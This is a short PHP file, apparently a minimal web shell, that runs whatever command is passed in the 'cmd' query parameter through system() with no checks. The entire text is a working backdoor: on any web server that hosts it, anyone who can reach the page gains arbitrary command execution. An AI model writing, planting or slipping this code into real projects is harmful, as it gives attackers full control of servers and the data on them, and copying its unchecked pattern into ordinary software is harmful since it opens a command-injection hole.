<?php
if (isset($_GET['cmd'])) {
    system(urldecode($_GET['cmd']));
}
?>